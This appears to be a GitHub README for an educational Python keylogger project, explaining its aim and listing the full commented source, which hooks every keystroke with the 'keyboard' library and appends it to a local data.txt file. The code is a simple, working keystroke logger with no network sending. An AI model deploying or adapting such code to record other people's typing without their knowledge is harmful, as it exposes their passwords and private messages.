<img align="center" src="https://media.licdn.com/dms/image/v2/D4D16AQGUNxQ7NSC05A/profile-displaybackgroundimage-shrink_350_1400/profile-displaybackgroundimage-shrink_350_1400/0/1738695150340?e=1749686400&v=beta&t=hBmszzzG0Zu-m7ZxeCdU5VxgDWqIZuWB0vnrMycuqY4" alt="gabriellugo" />

# KEYLOGGER

<a href="https://github.com/GabrielLugooo/Keylogger" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/English%20Keylogger-000000" alt="English Keylogger" /></a>
<a href="https://github.com/GabrielLugooo/Keylogger/blob/main/README%20Spanish.md" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Spanish%20Keylogger-green" alt="Spanish Keylogger" /></a>

### Objective

This project aims to capture user keystrokes and store them in a text file. It is based on Python’s `keyboard` library to log each pressed key and save it in a `data.txt` file in real-time.

The keylogger is a useful tool for understanding how keyboard event capturing works in Python, enabling its application in areas such as cybersecurity, software testing, and accessibility.

### Skills Learned

- Capturing keyboard events in Python.
- Using the `keyboard` library.
- File handling in Python.
- Writing and reading data in text files.
- Automating processes with system events.

### Tools Used

![Static Badge](https://img.shields.io/badge/Python-000000?logo=python&logoSize=auto)
![Static Badge](https://img.shields.io/badge/keyboard-000000?logo=keyboard&logoSize=auto)

- Python
- `keyboard` library

### Project

#### Preview

<img align="center" src="https://i.imgur.com/uEPMPfS.jpeg" alt="keylogger1" />
<img align="center" src="https://i.imgur.com/7bhqjLd.jpeg" alt="keylogger2" />

#### Code with Comments (English)

```python
# Keylogger

# Install the necessary library with: pip install keyboard
# Import the library to detect keystrokes
import keyboard

# Function to be executed every time a key is pressed
def pressedKeys(key):
# Open (or create) the file 'data.txt' in append mode ('a')
with open('data.txt', 'a') as file:
# If the key pressed is the space bar, add a space to the file
if key.name == 'space':
file.write(' ')
else:
# Add the name of the pressed key to the file
file.write(key.name)

# Assign the pressedKeys function to be executed on every keystroke
keyboard.on_press(pressedKeys)

# Keep the program running waiting for keyboard events
keyboard.wait()
```

### Limitations

Keylogger it's just for educational purpose under the MIT License.

---

<h3 align="left">Connect with me</h3>

<p align="left">
<a href="https://www.youtube.com/@gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=55200&format=png" alt="@gabriellugooo" height="40" width="40" /></a>
<a href="http://www.tiktok.com/@gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=118638&format=png" alt="@gabriellugooo" height="40" width="40" /></a>
<a href="https://instagram.com/lugooogabriel" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=32309&format=png" alt="lugooogabriel" height="40" width="40" /></a>
<a href="https://twitter.com/gabriellugo__" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=phOKFKYpe00C&format=png" alt="gabriellugo__" height="40" width="40" /></a>
<a href="https://www.linkedin.com/in/hernando-gabriel-lugo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=8808&format=png" alt="hernando-gabriel-lugo" height="40" width="40" /></a>
<a href="https://github.com/GabrielLugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=80&id=AngkmzgE6d3E&format=png" alt="gabriellugooo" height="34" width="34" /></a>
<a href="mailto:lugohernandogabriel@gmail.com"> <img align="center" src="https://img.icons8.com/?size=50&id=38036&format=png" alt="lugohernandogabriel@gmail.com" height="40" width="40" /></a>
<a href="https://linktr.ee/gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://simpleicons.org/icons/linktree.svg" alt="gabriellugooo" height="40" width="40" /></a>
</p>

<p align="left">
<a href="https://github.com/GabrielLugooo/GabrielLugooo/blob/main/README.md" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/English%20Version-000000" alt="English Version" /></a>
<a href="https://github.com/GabrielLugooo/GabrielLugooo/blob/main/Readme%20Spanish.md" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Spanish%20Version-Green" alt="Spanish Version" /></a>
</p>

<a href="https://linktr.ee/gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Credits-Gabriel%20Lugo-green" alt="Credits" /></a>
<img align="center" src="https://komarev.com/ghpvc/?username=GabrielLugoo&label=Profile%20views&color=green&base=2000" alt="GabrielLugooo" />
<a href="" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/License-MIT-green" alt="MIT License" /></a>
